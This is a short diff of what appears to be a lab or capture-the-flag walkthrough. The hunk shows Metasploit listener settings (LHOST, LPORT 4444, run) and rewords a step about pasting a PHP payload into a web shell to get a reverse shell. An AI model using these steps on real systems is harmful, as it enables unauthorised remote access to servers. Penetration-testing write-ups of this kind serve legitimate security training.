@@ -43,7 +43,7 @@ $ set LHOST 192.168.0.32
 $ set LPORT 4444
 $ run
 
-3. Paste the payload.php at the 404 Tamplate
+3. Paste the payload.php in web shell to get the reverse shell
 ```
 
 
